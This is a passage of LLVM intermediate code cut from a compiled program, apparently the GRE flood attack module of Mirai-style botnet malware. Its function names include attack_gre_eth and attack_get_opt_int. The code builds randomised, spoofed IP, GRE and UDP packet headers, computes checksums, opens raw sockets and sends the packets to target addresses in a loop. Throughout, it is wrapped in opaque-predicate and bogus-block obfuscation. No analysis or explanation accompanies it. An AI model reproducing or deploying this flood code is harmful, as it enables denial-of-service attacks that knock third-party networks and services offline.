  %358 = load i32, i32* %17, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i32 0, i32 1
  %362 = load i32, i32* %361, align 4
  %363 = call i32 @ntohl(i32 %362) #7
  %364 = call i32 @rand_next()
  %365 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %366 = load i32, i32* %17, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i32 0, i32 2
  %370 = load i8, i8* %369, align 4
  %371 = zext i8 %370 to i32
  %372 = lshr i32 %364, %371
  %373 = add i32 %363, %372
  %374 = call i32 @htonl(i32 %373) #7
  %375 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 9
  store i32 %374, i32* %376, align 4
  br label %377

; <label>:377:                                    ; preds = %356, %328
  %378 = load i32, i32* @x.21
  %379 = load i32, i32* @y.22
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %377
  %386 = load i32, i32* %29, align 4
  %387 = icmp eq i32 %386, -1
  %388 = load i32, i32* @x.21
  %389 = load i32, i32* @y.22
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %387, label %396, label %416

; <label>:396:                                    ; preds = %originalBBpart220
  %397 = load i32, i32* @x.21
  %398 = load i32, i32* @y.22
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %396
  %405 = call i32 @rand_next()
  %406 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 8
  store i32 %405, i32* %407, align 4
  %408 = load i32, i32* @x.21
  %409 = load i32, i32* @y.22
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %416

; <label>:416:                                    ; preds = %originalBBpart224, %originalBBpart220
  %417 = load i32, i32* @x.21
  %418 = load i32, i32* @y.22
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %416
  %425 = load i16, i16* %21, align 2
  %426 = zext i16 %425 to i32
  %427 = icmp eq i32 %426, 65535
  %428 = load i32, i32* @x.21
  %429 = load i32, i32* @y.22
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %427, label %436, label %451

; <label>:436:                                    ; preds = %originalBBpart228
  %437 = call i32 @rand_next()
  %438 = and i32 %437, 65535
  %439 = trunc i32 %438 to i16
  %440 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 3
  store i16 %439, i16* %441, align 4
  %442 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 3
  %444 = load i16, i16* %443, align 4
  %445 = zext i16 %444 to i32
  %446 = sub nsw i32 %445, 1000
  %447 = xor i32 %446, -1
  %448 = trunc i32 %447 to i16
  %449 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 3
  store i16 %448, i16* %450, align 4
  br label %451

; <label>:451:                                    ; preds = %436, %originalBBpart228
  %452 = load i32, i32* @x.21
  %453 = load i32, i32* @y.22
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %451
  %460 = load i16, i16* %24, align 2
  %461 = zext i16 %460 to i32
  %462 = icmp eq i32 %461, 65535
  %463 = load i32, i32* @x.21
  %464 = load i32, i32* @y.22
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %462, label %471, label %477

; <label>:471:                                    ; preds = %originalBBpart232
  %472 = call i32 @rand_next()
  %473 = and i32 %472, 65535
  %474 = trunc i32 %473 to i16
  %475 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %476 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %475, i32 0, i32 0
  store i16 %474, i16* %476, align 2
  br label %477

; <label>:477:                                    ; preds = %471, %originalBBpart232
  %478 = load i32, i32* @x.21
  %479 = load i32, i32* @y.22
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %477
  %486 = load i16, i16* %25, align 2
  %487 = zext i16 %486 to i32
  %488 = icmp eq i32 %487, 65535
  %489 = load i32, i32* @x.21
  %490 = load i32, i32* @y.22
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %488, label %497, label %519

; <label>:497:                                    ; preds = %originalBBpart236
  %498 = load i32, i32* @x.21
  %499 = load i32, i32* @y.22
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %497
  %506 = call i32 @rand_next()
  %507 = and i32 %506, 65535
  %508 = trunc i32 %507 to i16
  %509 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %510 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %509, i32 0, i32 1
  store i16 %508, i16* %510, align 2
  %511 = load i32, i32* @x.21
  %512 = load i32, i32* @y.22
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBBpart246, label %originalBB38alteredBB

originalBBpart246:                                ; preds = %originalBB38
  br label %519

; <label>:519:                                    ; preds = %originalBBpart246, %originalBBpart236
  %520 = load i8, i8* %28, align 1
  %521 = icmp ne i8 %520, 0
  br i1 %521, label %526, label %522

; <label>:522:                                    ; preds = %519
  %523 = call i32 @rand_next()
  %524 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 9
  store i32 %523, i32* %525, align 4
  br label %532

; <label>:526:                                    ; preds = %519
  %527 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i32 0, i32 9
  %529 = load i32, i32* %528, align 4
  %530 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 9
  store i32 %529, i32* %531, align 4
  br label %532

; <label>:532:                                    ; preds = %526, %522
  %533 = load i32, i32* @x.21
  %534 = load i32, i32* @y.22
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %532
  %541 = load i8, i8* %27, align 1
  %542 = icmp ne i8 %541, 0
  %543 = load i32, i32* @x.21
  %544 = load i32, i32* @y.22
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %542, label %551, label %554

; <label>:551:                                    ; preds = %originalBBpart250
  %552 = load i8*, i8** %39, align 8
  %553 = load i32, i32* %26, align 4
  call void @rand_str(i8* %552, i32 %553)
  br label %554

; <label>:554:                                    ; preds = %551, %originalBBpart250
  %555 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %556 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %555, i32 0, i32 7
  store i16 0, i16* %556, align 2
  %557 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %558 = bitcast %struct.iphdr* %557 to i16*
  %559 = call zeroext i16 @checksum_generic(i16* %558, i32 20)
  %560 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %561 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %560, i32 0, i32 7
  store i16 %559, i16* %561, align 2
  %562 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %563 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %562, i32 0, i32 7
  store i16 0, i16* %563, align 2
  %564 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %565 = bitcast %struct.iphdr* %564 to i16*
  %566 = call zeroext i16 @checksum_generic(i16* %565, i32 20)
  %567 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %568 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %567, i32 0, i32 7
  store i16 %566, i16* %568, align 2
  %569 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %570 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %569, i32 0, i32 3
  store i16 0, i16* %570, align 2
  %571 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %572 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %573 = bitcast %struct.udphdr* %572 to i8*
  %574 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %575 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %574, i32 0, i32 2
  %576 = load i16, i16* %575, align 2
  %577 = load i32, i32* %26, align 4
  %578 = sext i32 %577 to i64
  %579 = add i64 8, %578
  %580 = trunc i64 %579 to i32
  %581 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %571, i8* %573, i16 zeroext %576, i32 %580)
  %582 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %583 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %582, i32 0, i32 3
  store i16 %581, i16* %583, align 2
  %584 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %585 = load i32, i32* %17, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i64 %586
  %588 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i32 0, i32 0
  %589 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %588, i32 0, i32 0
  store i16 2, i16* %589, align 4
  %590 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %591 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %590, i32 0, i32 9
  %592 = load i32, i32* %591, align 4
  %593 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %594 = load i32, i32* %17, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %593, i64 %595
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i32 0, i32 0
  %598 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %597, i32 0, i32 2
  %599 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %598, i32 0, i32 0
  store i32 %592, i32* %599, align 4
  %600 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %601 = load i32, i32* %17, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %600, i64 %602
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %603, i32 0, i32 0
  %605 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %604, i32 0, i32 1
  store i16 0, i16* %605, align 2
  %606 = load i32, i32* %18, align 4
  %607 = load i8*, i8** %34, align 8
  %608 = load i32, i32* %26, align 4
  %609 = sext i32 %608 to i64
  %610 = add i64 52, %609
  %611 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %612 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %613 = load i32, i32* %17, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %612, i64 %614
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i32 0, i32 0
  %617 = bitcast %struct.sockaddr_in* %616 to %struct.sockaddr*
  store %struct.sockaddr* %617, %struct.sockaddr** %611, align 8
  %618 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %619 = load %struct.sockaddr*, %struct.sockaddr** %618, align 8
  %620 = call i64 @sendto(i32 %606, i8* %607, i64 %610, i32 16384, %struct.sockaddr* %619, i32 16)
  br label %621

; <label>:621:                                    ; preds = %554
  %622 = load i32, i32* %17, align 4
  %623 = add nsw i32 %622, 1
  store i32 %623, i32* %17, align 4
  br label %323

; <label>:624:                                    ; preds = %323
  %625 = load i32, i32* @x.21
  %626 = load i32, i32* @y.22
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %624
  %633 = load i32, i32* @x.21
  %634 = load i32, i32* @y.22
  %635 = sub i32 %633, 1
  %636 = mul i32 %633, %635
  %637 = urem i32 %636, 2
  %638 = icmp eq i32 %637, 0
  %639 = icmp slt i32 %634, 10
  %640 = or i1 %638, %639
  br i1 %640, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %306

; <label>:641:                                    ; preds = %100, %94
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %642 = alloca i8, align 1
  %643 = alloca %struct.attack_target*, align 8
  %644 = alloca i8, align 1
  %645 = alloca %struct.attack_option*, align 8
  %646 = alloca i32, align 4
  %647 = alloca i32, align 4
  %648 = alloca i8**, align 8
  %649 = alloca i8, align 1
  %650 = alloca i16, align 2
  %651 = alloca i8, align 1
  %652 = alloca i8, align 1
  %653 = alloca i16, align 2
  %654 = alloca i16, align 2
  %655 = alloca i32, align 4
  %656 = alloca i8, align 1
  %657 = alloca i8, align 1
  %658 = alloca i32, align 4
  %659 = alloca %struct.iphdr*, align 8
  %660 = alloca %struct.grehdr*, align 8
  %661 = alloca %struct.iphdr*, align 8
  %662 = alloca %struct.udphdr*, align 8
  %663 = alloca i8*, align 8
  %664 = alloca %struct.iphdr*, align 8
  %665 = alloca %struct.grehdr*, align 8
  %666 = alloca %struct.iphdr*, align 8
  %667 = alloca %struct.udphdr*, align 8
  %668 = alloca i8*, align 8
  %669 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %642, align 1
  store %struct.attack_target* %1, %struct.attack_target** %643, align 8
  store i8 %2, i8* %644, align 1
  store %struct.attack_option* %3, %struct.attack_option** %645, align 8
  %670 = load i8, i8* %642, align 1
  %671 = zext i8 %670 to i64
  %672 = call noalias i8* @calloc(i64 %671, i64 8) #6
  %673 = bitcast i8* %672 to i8**
  store i8** %673, i8*** %648, align 8
  %674 = load i8, i8* %644, align 1
  %675 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %676 = call i32 @attack_get_opt_int(i8 zeroext %674, %struct.attack_option* %675, i8 zeroext 2, i32 0)
  %677 = trunc i32 %676 to i8
  store i8 %677, i8* %649, align 1
  %678 = load i8, i8* %644, align 1
  %679 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %680 = call i32 @attack_get_opt_int(i8 zeroext %678, %struct.attack_option* %679, i8 zeroext 3, i32 65535)
  %681 = trunc i32 %680 to i16
  store i16 %681, i16* %650, align 2
  %682 = load i8, i8* %644, align 1
  %683 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %684 = call i32 @attack_get_opt_int(i8 zeroext %682, %struct.attack_option* %683, i8 zeroext 4, i32 64)
  %685 = trunc i32 %684 to i8
  store i8 %685, i8* %651, align 1
  %686 = load i8, i8* %644, align 1
  %687 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %688 = call i32 @attack_get_opt_int(i8 zeroext %686, %struct.attack_option* %687, i8 zeroext 5, i32 1)
  %689 = trunc i32 %688 to i8
  store i8 %689, i8* %652, align 1
  %690 = load i8, i8* %644, align 1
  %691 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %692 = call i32 @attack_get_opt_int(i8 zeroext %690, %struct.attack_option* %691, i8 zeroext 6, i32 65535)
  %693 = trunc i32 %692 to i16
  store i16 %693, i16* %653, align 2
  %694 = load i8, i8* %644, align 1
  %695 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %696 = call i32 @attack_get_opt_int(i8 zeroext %694, %struct.attack_option* %695, i8 zeroext 7, i32 65535)
  %697 = trunc i32 %696 to i16
  store i16 %697, i16* %654, align 2
  %698 = load i8, i8* %644, align 1
  %699 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %700 = call i32 @attack_get_opt_int(i8 zeroext %698, %struct.attack_option* %699, i8 zeroext 0, i32 512)
  store i32 %700, i32* %655, align 4
  %701 = load i8, i8* %644, align 1
  %702 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %703 = call i32 @attack_get_opt_int(i8 zeroext %701, %struct.attack_option* %702, i8 zeroext 1, i32 1)
  %704 = trunc i32 %703 to i8
  store i8 %704, i8* %656, align 1
  %705 = load i8, i8* %644, align 1
  %706 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %707 = call i32 @attack_get_opt_int(i8 zeroext %705, %struct.attack_option* %706, i8 zeroext 19, i32 0)
  %708 = trunc i32 %707 to i8
  store i8 %708, i8* %657, align 1
  %709 = load i8, i8* %644, align 1
  %710 = load %struct.attack_option*, %struct.attack_option** %645, align 8
  %711 = load i32, i32* @LOCAL_ADDR, align 4
  %712 = call i32 @attack_get_opt_int(i8 zeroext %709, %struct.attack_option* %710, i8 zeroext 25, i32 %711)
  store i32 %712, i32* %658, align 4
  %713 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %713, i32* %647, align 4
  %714 = icmp eq i32 %713, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %103
  store i32 0, i32* %17, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %232
  %715 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %716 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %715, i32 0, i32 6
  store i8 17, i8* %716, align 1
  %717 = call i32 @rand_next()
  %718 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %719 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %718, i32 0, i32 8
  store i32 %717, i32* %719, align 4
  %720 = load i8, i8* %28, align 1
  %721 = icmp ne i8 %720, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %256
  %722 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %723 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %722, i32 0, i32 9
  %724 = load i32, i32* %723, align 4
  %725 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %726 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %725, i32 0, i32 9
  store i32 %724, i32* %726, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %306
  store i32 0, i32* %17, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %377
  %727 = load i32, i32* %29, align 4
  %728 = icmp eq i32 %727, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %396
  %729 = call i32 @rand_next()
  %730 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %731 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %730, i32 0, i32 8
  store i32 %729, i32* %731, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %416
  %732 = load i16, i16* %21, align 2
  %733 = zext i16 %732 to i32
  %734 = icmp eq i32 %733, 65535
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %451
  %735 = load i16, i16* %24, align 2
  %736 = zext i16 %735 to i32
  %737 = icmp eq i32 %736, 65535
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %477
  %738 = load i16, i16* %25, align 2
  %739 = zext i16 %738 to i32
  %740 = icmp eq i32 %739, 65535
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %497
  %741 = call i32 @rand_next()
  %_ = sub i32 0, %741
  %gen = add i32 %_, 65535
  %_39 = sub i32 0, %741
  %gen40 = add i32 %_39, 65535
  %_41 = sub i32 0, %741
  %gen42 = add i32 %_41, 65535
  %_43 = sub i32 0, %741
  %gen44 = add i32 %_43, 65535
  %742 = and i32 %741, 65535
  %743 = trunc i32 %742 to i16
  %744 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %745 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %744, i32 0, i32 1
  store i16 %743, i16* %745, align 2
  br label %originalBB38

originalBB48alteredBB:                            ; preds = %originalBB48, %532
  %746 = load i8, i8* %27, align 1
  %747 = icmp ne i8 %746, 0
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %624
  br label %originalBB52
}

declare zeroext i16 @checksum_generic(i16*, i32) #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %103

; <label>:86:                                     ; preds = %4
  %87 = load i32, i32* @x.23
  %88 = load i32, i32* @y.24
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %86
  %95 = load i32, i32* @x.23
  %96 = load i32, i32* @y.24
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %648

; <label>:103:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %104 = load i32, i32* %10, align 4
  %105 = bitcast i32* %9 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %111

; <label>:108:                                    ; preds = %103
